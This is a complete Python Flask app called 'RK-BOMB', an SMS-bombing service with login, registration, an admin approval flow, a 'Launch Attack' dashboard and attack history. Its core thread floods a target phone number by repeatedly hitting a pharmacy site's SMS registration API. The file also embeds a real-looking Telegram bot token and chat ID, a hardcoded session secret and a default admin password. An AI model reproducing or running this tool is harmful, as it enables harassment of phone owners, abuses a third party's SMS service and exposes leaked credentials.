import requests, threading, os, time, json, sqlite3
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from requests_toolbelt.multipart.encoder import MultipartEncoder
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = "RK_RAIHAN_PREMIUM_FINAL_FIX"

# ---------- CONFIG ----------
TG_BOT_TOKEN = "8694093332:AAGOOWD8Ms_KoRZJFHC58mqLkEQozA2aOx4"
MY_CHAT_ID = "6048050987" 
RENDER_URL = "https://rk-bomb.onrender.com" 
ADMIN_USERNAME = "admin"

# ---------- DATABASE ----------
def get_db():
    conn = sqlite3.connect('system.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT UNIQUE, password TEXT, role TEXT, status TEXT)')
    conn.execute('CREATE TABLE IF NOT EXISTS history (id INTEGER PRIMARY KEY, username TEXT, phone TEXT, success INTEGER, total INTEGER, status TEXT)')
    try:
        conn.execute("INSERT INTO users (username, password, role, status) VALUES (?, ?, 'admin', 'approved')", 
                     (ADMIN_USERNAME, generate_password_hash("admin123")))
        conn.commit()
    except: pass
    conn.close()

init_db()

# ---------- CORE BOMBING ----------
active_sessions = {}

def bombing_task(username, phone, limit):
    key = f"{username}_{phone}"
    while key in active_sessions:
        if active_sessions[key]['total'] >= limit:
            conn = get_db()
            conn.execute("INSERT INTO history (username, phone, success, total, status) VALUES (?,?,?,?,?)",
                         (username, phone, active_sessions[key]['success'], active_sessions[key]['total'], "completed"))
            conn.commit()
            conn.close()
            del active_sessions[key]
            break
        
        if active_sessions[key]['status'] == 'running':
            try:
                requests.get(f"https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={phone}", timeout=5)
                active_sessions[key]['success'] += 1
            except: pass
            active_sessions[key]['total'] += 1
            time.sleep(1)
        else: time.sleep(2)

# ---------- DESIGN (REPAIRED LAYOUT) ----------
# এখানে {% block content %} এর বদলে [CONTENT_HERE] রাখা হয়েছে যাতে এরর না আসে
HTML_LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>RK-BOMB ★ PREMIUM</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: #0a0a0a; color: #fff; font-family: 'Poppins', sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
        .header { background: #111; padding: 18px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #00ff00; position: sticky; top:0; z-index: 100; box-shadow: 0 4px 10px rgba(0,255,0,0.2); }
        .menu-btn { font-size: 24px; cursor: pointer; color: #00ff00; border: none; background: none; }
        .brand { color: #00ff00; font-weight: 600; font-size: 20px; letter-spacing: 1px; }
        .sidebar { height: 100%; width: 0; position: fixed; z-index: 1001; top: 0; left: 0; background: rgba(0,0,0,0.95); backdrop-filter: blur(10px); overflow-x: hidden; transition: 0.3s; padding-top: 60px; border-right: 1px solid #00ff00; }
        .sidebar a { padding: 15px 30px; text-decoration: none; font-size: 18px; color: #fff; display: block; transition: 0.2s; border-bottom: 1px solid #222; }
        .sidebar a:hover { background: #00ff00; color: #000; }
        .sidebar .close-btn { position: absolute; top: 10px; right: 20px; font-size: 36px; color: #ff0000; text-decoration: none; }
        .container { padding: 20px; width: 100%; max-width: 500px; margin: auto; min-height: 80vh; }
        .card { background: #1a1a1a; border: 1px solid #333; padding: 25px; border-radius: 15px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border-top: 4px solid #00ff00; }
        h2, h3 { margin-top: 0; color: #00ff00; text-align: center; }
        input { width: 100%; padding: 15px; background: #000; border: 1px solid #444; color: #fff; border-radius: 10px; font-size: 16px; outline: none; transition: 0.3s; margin-bottom: 15px; }
        input:focus { border-color: #00ff00; box-shadow: 0 0 10px rgba(0,255,0,0.3); }
        .btn-primary { width: 100%; padding: 15px; background: #00ff00; border: none; color: #000; font-size: 18px; font-weight: 600; border-radius: 10px; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        .btn-danger { background: #ff4d4d; color: #fff; margin-top: 15px; border-radius: 8px; padding: 10px; border: none; width: 100%; font-weight: 600; cursor: pointer; }
        .progress-container { background: #333; height: 10px; border-radius: 5px; margin: 10px 0; overflow: hidden; }
        .progress-fill { background: #00ff00; height: 100%; transition: 0.5s; width: 0%; }
        footer { text-align: center; padding: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
<div id="mySidebar" class="sidebar">
    <a href="javascript:void(0)" class="close-btn" onclick="closeNav()">&times;</a>
    <a href="/dashboard">🏠 Dashboard</a>
    <a href="/history">📜 History</a>
    <a href="/logout" style="color:#ff4d4d;">🛑 Logout</a>
</div>
<div class="header">
    <button class="menu-btn" onclick="openNav()">&#9776;</button>
    <div class="brand">RK-BOMB ★</div>
    <div style="width: 24px;"></div>
</div>
<div class="container">
    [CONTENT_HERE]
</div>
<footer>Powered by RK RAIHAN ★ 2026</footer>
<script>
    function openNav() { document.getElementById("mySidebar").style.width = "280px"; }
    function closeNav() { document.getElementById("mySidebar").style.width = "0"; }
</script>
</body>
</html>
'''

# ---------- ROUTES ----------
@app.route('/')
def home():
    if 'user' in session: return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form['u'], request.form['p']
        conn = get_db()
        res = conn.execute("SELECT password, status FROM users WHERE username = ?", (u,)).fetchone()
        conn.close()
        if res and check_password_hash(res['password'], p):
            if res['status'] == 'approved':
                session['user'] = u
                return redirect(url_for('dashboard'))
            return "<h2>Access Pending!</h2>"
    return render_template_string(HTML_LAYOUT.replace('[CONTENT_HERE]', '''
    <div class="card">
        <h2>LOGIN</h2>
        <form method="POST">
            <input name="u" placeholder="Username" required>
            <input name="p" type="password" placeholder="Password" required>
            <button class="btn-primary">LOGIN</button>
        </form>
        <p style="text-align:center;">New? <a href="/register" style="color:#00ff00;">Register</a></p>
    </div>
    '''))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        u, p = request.form['u'], generate_password_hash(request.form['p'])
        try:
            conn = get_db()
            conn.execute("INSERT INTO users (username, password, role, status) VALUES (?, ?, 'user', 'pending')", (u, p))
            conn.commit()
            conn.close()
            requests.post(f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage", json={"chat_id": MY_CHAT_ID, "text": f"🔔 New User: {u}"})
            return "<h2>Success! Wait for Admin.</h2>"
        except: return "<h2>Username taken!</h2>"
    return render_template_string(HTML_LAYOUT.replace('[CONTENT_HERE]', '''
    <div class="card">
        <h2>REGISTER</h2>
        <form method="POST">
            <input name="u" placeholder="Username" required>
            <input name="p" type="password" placeholder="Password" required>
            <button class="btn-primary">CREATE ACCOUNT</button>
        </form>
    </div>
    '''))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(HTML_LAYOUT.replace('[CONTENT_HERE]', '''
    <div class="card">
        <h3>🔥 LAUNCH ATTACK</h3>
        <form action="/api/start">
            <input name="num" placeholder="Target Number" required>
            <input name="amt" type="number" placeholder="Amount" required>
            <button class="btn-primary">START BOMBING</button>
        </form>
    </div>
    <div id="live"></div>
    <script>
        setInterval(() => {
            fetch('/api/status').then(r => r.json()).then(data => {
                let h = '';
                for(let k in data) {
                    let s = data[k];
                    let p = Math.round((s.total/s.limit)*100);
                    h += `<div class="card" style="border-top-color:#00ccff;">
                        <b>📱 ${s.phone}</b> [${s.success}/${s.limit}]
                        <div class="progress-container"><div class="progress-fill" style="width:${p}%"></div></div>
                        <button class="btn-danger" onclick="location.href='/api/stop?num=${s.phone}'">STOP</button>
                    </div>`;
                }
                document.getElementById('live').innerHTML = h;
            });
        }, 2000);
    </script>
    '''))

@app.route('/history')
def history():
    if 'user' not in session: return redirect(url_for('login'))
    conn = get_db()
    rows = conn.execute("SELECT * FROM history WHERE username = ? ORDER BY id DESC", (session['user'],)).fetchall()
    conn.close()
    content = "<h3>📜 HISTORY</h3>"
    for r in rows:
        content += f"<div class='card' style='font-size:14px;'>Target: {r['phone']} | Success: {r['success']}</div>"
    return render_template_string(HTML_LAYOUT.replace('[CONTENT_HERE]', content))

@app.route('/api/start')
def start():
    u, num, amt = session.get('user'), request.args.get('num'), int(request.args.get('amt', 0))
    if u and num and amt:
        key = f"{u}_{num}"
        active_sessions[key] = {'phone': num, 'status': 'running', 'success': 0, 'total': 0, 'limit': amt}
        threading.Thread(target=bombing_task, args=(u, num, amt), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/status')
def status():
    return jsonify({k:v for k,v in active_sessions.items() if k.startswith(session.get('user',''))})

@app.route('/api/stop')
def stop():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: del active_sessions[key]
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
